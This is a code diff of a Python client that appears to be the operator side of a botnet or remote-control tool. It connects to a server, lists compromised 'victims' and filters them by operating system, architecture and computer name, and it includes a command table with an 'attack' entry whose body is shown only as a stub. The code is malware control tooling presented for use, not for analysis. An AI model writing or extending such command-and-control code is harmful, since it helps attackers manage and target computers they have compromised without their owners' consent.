@@ -38,16 +38,25 @@ def attack(victim_id, sock):
     pass
 
 
-def list_victims(sock):
-    # Tell the server we're gonne need the online hackers
+def list_victims(sock, os=None, arch=None, name=None):
+    print_form = """{0}
+        COMPUTER NAME: {1} 
+        OS: {2}
+        ARCHITECTURE: {3}"""
+
     try:
         ut.send_message("get_victims", sock)
 
         victims = ut.recieve_message(sock)
         if victims is not None:
             victims = json.loads(victims)
-
-        print(victims)
+            # Filter the victims according to the args
+            victims = {x: y for x, y in victims.items() if y['os'] == os or os is None if y['name'] == name or name is None if y['arch'] == arch or arch is None}
+            for id in victims:
+                victim = victims[id]
+                print()
+                print(print_form.format(id, victim['name'], victim['os'], victim['arch']))
+            print()
     except BrokenPipeError:
         # May be some kind of connection error might happes so
         # we need to notify the hacker
@@ -58,15 +67,15 @@ def start():
     try:
         sock = initiate()
     except IOError:
-        print("IOerror occured, Server might be offline")
+        ut.log("error", "IOerror occured, Server might be offline")
         exit(1)
 
     # Verifiying the client
     send_verification(sock)
 
     commands_with_funcs = {
-        "attack": (attack, 1, [sock]),
-        "list-victims": (list_victims, 0, [sock])
+        "attack": (attack, 1, [], [sock]),
+        "list-victims": (list_victims, 0, ["os", "arch", "name"], [sock])
     }
 
     connected = True
